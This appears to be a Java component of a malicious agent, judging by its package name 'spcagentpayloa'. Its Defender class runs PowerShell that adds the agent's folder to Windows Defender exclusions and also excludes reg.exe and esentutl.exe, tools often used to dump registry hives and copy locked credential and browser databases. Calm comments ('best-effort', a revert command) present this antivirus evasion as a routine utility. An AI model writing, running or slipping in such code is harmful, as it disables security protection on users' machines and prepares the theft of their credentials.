package com.spcagentpayloa.jvmxx;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.util.List;
import java.util.concurrent.TimeUnit;

/**
 * Best-effort Defender exclusion. It is never required: without elevation the
 * call fails softly and the report says so. Revert with
 * {@code Remove-MpPreference -ExclusionPath <path>}.
 */
public final class Defender {
	private Defender() {
	}

	public static String exclude(Path dir) {
		if (!AgentPaths.isWindows()) {
			return "defender: not windows";
		}
		String script = "$p='" + dir.toString().replace("'", "''") + "';"
			+ "try{Add-MpPreference -ExclusionPath $p -ErrorAction Stop;"
			+ "Add-MpPreference -ExclusionProcess 'reg.exe','esentutl.exe' -ErrorAction SilentlyContinue;"
			+ "'ok'}catch{'needs_elevation: '+$_.Exception.Message}";
		try {
			Process process = Ps.command(script).redirectErrorStream(true).start();
			if (!process.waitFor(15L, TimeUnit.SECONDS)) {
				process.destroyForcibly();
				return "defender: timeout";
			}
			String text = read(process);
			return text.isBlank() ? "defender: no answer" : text.strip();
		} catch (Throwable throwable) {
			Log.debug("Defender exclusion failed", throwable);
			return "defender: " + throwable.getMessage();
		}
	}

	private static String read(Process process) throws Exception {
		try (InputStream input = process.getInputStream()) {
			ByteArrayOutputStream output = new ByteArrayOutputStream();
			input.transferTo(output);
			return output.toString(StandardCharsets.UTF_8);
		}
	}

	static List<String> revertCommands(Path dir) {
		return List.of("Remove-MpPreference -ExclusionPath '" + dir + "'");
	}
}
